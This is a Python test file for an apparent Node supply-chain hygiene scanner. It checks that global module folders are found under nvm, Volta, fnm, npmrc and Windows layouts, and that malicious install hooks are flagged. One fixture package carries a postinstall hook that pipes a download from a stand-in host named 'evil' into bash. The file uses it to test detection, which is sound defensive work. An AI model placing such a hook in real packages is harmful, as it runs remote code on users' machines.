#!/usr/bin/env python3
"""The global install tree is found however Node was installed (Ndevu12/saw#134)."""
from __future__ import annotations

import os
import stat
import tempfile
import unittest
from pathlib import Path
from unittest import mock

import json

from stayawake.bots.security.hygiene import global_prefix
from stayawake.utils import hostdenial


class TestEveryLayoutIsReached(unittest.TestCase):
    def setUp(self):
        self.home = Path(tempfile.mkdtemp())
        self.addCleanup(self._release)
        self._locked: list[Path] = []

    def _release(self):
        for p in self._locked:
            try:
                os.chflags(p, 0)
            except (OSError, AttributeError):
                pass

    def _roots(self, env=None):
        # The runner has its own Node installed, so the version-manager variables are cleared:
        # without that, this reads the runner's tree instead of the fixture.
        cleared = {k: "" for k in ("NVM_DIR", "VOLTA_HOME", "FNM_DIR", "npm_config_prefix",
                                   "NPM_CONFIG_USERCONFIG", "PREFIX", "NODE_PREFIX")}
        with mock.patch.object(global_prefix.Path, "home", return_value=self.home), \
             mock.patch.dict(os.environ, {**cleared, **(env or {})}, clear=False), \
             mock.patch.object(global_prefix, "_npm_prefix_roots", lambda: []):
            return [str(p) for p in global_prefix.global_module_roots()]

    def _tree(self, *parts):
        d = self.home.joinpath(*parts)
        d.mkdir(parents=True)
        return d

    def test_a_unix_prefix_keeps_its_packages_under_lib(self):
        d = self._tree("usr", "local", "lib", "node_modules")
        self.assertIn(str(d), self._roots({"npm_config_prefix": str(self.home / "usr" / "local")}))

    def test_a_windows_prefix_has_no_lib_folder(self):
        d = self._tree("AppData", "npm", "node_modules")
        self.assertIn(str(d), self._roots({"npm_config_prefix": str(self.home / "AppData" / "npm")}))

    def test_every_installed_version_of_a_managed_node_is_reached(self):
        old = self._tree(".nvm", "versions", "node", "v20.0.0", "lib", "node_modules")
        new = self._tree(".nvm", "versions", "node", "v24.13.1", "lib", "node_modules")
        found = self._roots()
        self.assertIn(str(old), found, "a payload under a version that is not current is still there")
        self.assertIn(str(new), found)

    def test_volta_and_fnm_layouts_are_reached(self):
        v = self._tree(".volta", "tools", "image", "node", "22.1.0", "lib", "node_modules")
        f = self._tree(".fnm", "node-versions", "v18.0.0", "installation", "lib", "node_modules")
        found = self._roots()
        self.assertIn(str(v), found)
        self.assertIn(str(f), found)

    def test_a_prefix_named_only_in_npmrc_is_read_from_the_file(self):
        d = self._tree("elsewhere", "lib", "node_modules")
        (self.home / ".npmrc").write_text(f"prefix = {self.home / 'elsewhere'}\n", encoding="utf-8")
        self.assertIn(str(d), self._roots())

    def test_a_location_this_tool_controls_is_not_returned(self):
        d = self._tree("usr", "local", "lib", "node_modules")
        os.chmod(d, 0o555)
        try:
            os.chflags(d, stat.UF_IMMUTABLE)
        except (OSError, AttributeError):
            self.skipTest("no user-settable immutable flag here")
        self._locked.append(d)
        if not hostdenial.held_by_us(d):
            self.skipTest("the immutable flag did not take on this filesystem")
        self.assertEqual(self._roots({"npm_config_prefix": str(self.home / "usr" / "local")}), [])


if __name__ == "__main__":
    unittest.main()


class TestWhatTheGlobalTreeCarriesIsReported(unittest.TestCase):
    """A clean global tree is quiet; an infected one is not. Both directions, so neither is vacuous."""

    def setUp(self):
        self.prefix = Path(tempfile.mkdtemp())
        self.root = self.prefix / "lib" / "node_modules"
        self.root.mkdir(parents=True)

    def _install(self, name: str, hook: str | None = None):
        d = self.root / name
        d.mkdir()
        manifest = {"name": name, "version": "1.0.0"}
        if hook is not None:
            manifest["scripts"] = {"postinstall": hook}
        (d / "package.json").write_text(json.dumps(manifest), encoding="utf-8")

    def _issues(self):
        with mock.patch.object(global_prefix, "global_module_roots", lambda: [self.root]):
            return global_prefix.check_global_install_tree()

    def test_a_malicious_install_hook_is_reported(self):
        self._install("evil", "curl -s https://evil/x | bash")
        found = self._issues()
        self.assertTrue(found, "a payload in a globally installed package went unreported")
        self.assertIn(str(self.root), found[0].detail)

    def test_ordinary_global_packages_are_not_reported_for_having_no_lockfile(self):
        for name in ("npm", "corepack", "typescript", "yarn"):
            self._install(name)
        self.assertEqual(self._issues(), [],
                         "no lockfile governs a global tree, so nothing here is unaccounted")
